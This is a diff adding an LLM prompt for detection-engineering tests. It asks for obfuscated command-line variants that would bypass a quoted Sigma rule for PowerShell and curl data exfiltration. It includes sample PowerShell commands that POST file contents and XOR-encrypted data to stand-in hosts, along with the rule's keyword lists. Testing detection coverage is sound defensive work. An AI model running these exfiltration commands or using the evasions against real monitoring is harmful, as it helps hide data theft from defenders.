@@ -1,0 +1,119 @@
+You are a SIEM detection engineering assistant with expert knowledge of Sigma rules, Windows process creation logs, and command-line parsing.
+
+Your task is to assess whether the given Sigma rule may be bypassed by safe command-line obfuscation/mutation techniques
+
+Allowed command-line mutation techniques:
+
+1. Insertion: Insert characters that the shell/application may ignore or still parse correctly, such as quotes, spaces, or escape characters.
+2. Substitution: Replace syntax with equivalent syntax, such as short option to long option, `/flag` to `-flag`, or equivalent argument forms.
+3. Omission: Remove optional or unnecessary elements while preserving the intended test behavior, such as omitting `.exe` or optional flags.
+4. Reordering: Reorder arguments if the target program accepts different argument order without changing behavior.
+5. Recoding / Encoding: Represent the same value differently, such as environment variables, path normalization, alternative IP notation, or equivalent string representation.
+6. Other  techniques
+
+Analysis procedure:
+
+1. Parse the Sigma rule and identify the fields and exact search terms that are likely to trigger detection.
+2. Compare the rule logic with the true positive test command.
+3. Identify which tokens in the true positive command are semantically important and which tokens are only syntactic indicators used by the rule.
+4. Generate only command-line variants that are safe, simulated, and likely to preserve the intended test behavior.
+5. For each generated command, explain:
+
+   * which mutation technique was used;
+   * which rule condition it is intended to avoid;
+   * why the high-level behavior is expected to remain equivalent in a test environment;
+   * any assumption or uncertainty.
+
+Input:
+
+Sigma Rule:
+
+```yaml
+title: Potential Data Exfiltration Activity Via CommandLine Tools
+id: 7d1aaf3d-4304-425c-b7c3-162055e0b3ab
+status: test
+description: Detects the use of various CLI utilities exfiltrating data via web requests
+references:
+    - https://www.sentinelone.com/blog/living-off-windows-defender-lockbit-ransomware-sideloads-cobalt-strike-through-microsoft-security-tool/
+author: Nasreddine Bencherchali (Nextron Systems)
+date: 2022-08-02
+modified: 2025-07-18
+tags:
+    - attack.execution
+    - attack.t1059.001
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_iwr:
+        Image|endswith:
+            - '\powershell_ise.exe'
+            - '\powershell.exe'
+            - '\pwsh.exe'
+            - '\cmd.exe'
+        CommandLine|contains:
+            - 'curl '
+            - 'Invoke-RestMethod'
+            - 'Invoke-WebRequest'
+            - 'irm '
+            - 'iwr '
+            - 'wget '
+        CommandLine|contains|all:
+            - ' -ur' # Shortest possible version of the -uri flag
+            - ' -me' # Shortest possible version of the -method flag
+            - ' -b'
+            - ' POST '
+    selection_curl:
+        Image|endswith: '\curl.exe'
+        CommandLine|contains: '--ur' # Shortest possible version of the --uri flag
+    selection_curl_data:
+        CommandLine|contains:
+            - ' -d ' # Shortest possible version of the --data flag
+            - ' --data '
+    selection_wget:
+        Image|endswith: '\wget.exe'
+        CommandLine|contains:
+            - '--post-data'
+            - '--post-file'
+    payloads:
+        - CommandLine|contains:
+              - 'Get-Content'
+              - 'GetBytes'
+              - 'hostname'
+              - 'ifconfig'
+              - 'ipconfig'
+              - 'net view'
+              - 'netstat'
+              - 'nltest'
+              - 'qprocess'
+              - 'sc query'
+              - 'systeminfo'
+              - 'tasklist'
+              - 'ToBase64String'
+              - 'whoami'
+        - CommandLine|contains|all:
+              - 'type '
+              - ' > '
+              - ' C:\'
+    condition: (selection_iwr or all of selection_curl* or selection_wget) and payloads
+falsepositives:
+    - Unlikely
+level: high
+```
+
+True positive test command:
+
+```text
+"powershell.exe" & {$content = Get-Content C:\Windows\System32\notepad.exe Invoke-WebRequest -Uri http://127.0.0.1 -Method POST -Body $content}
+"powershell.exe" & {$plaintext = ([system.Text.Encoding]::UTF8.getBytes(\""Path\n----\nC:\Users\victim\"")) $key = \""abcdefghijklmnopqrstuvwxyz123456\"" $cyphertext = @(); for ($i = 0; $i -lt $plaintext.Count; $i++) { $cyphertext += $plaintext[$i] -bxor $key[$i %% $key.Length]; } $cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext) [System.Net.ServicePointManager]::Expect100Continue = $false Invoke-WebRequest -Uri example.com -Method POST -Body $cyphertext -DisableKeepAlive}
+```
+
+Output JSON schema:
+[
+{
+"output": "A generated simulated command line. Use an empty string only when no safe command can be generated.",
+"explanation": "A short explanation mentioning the mutation technique and the avoided rule condition." "
+}
+]
+
+Return JSON only.
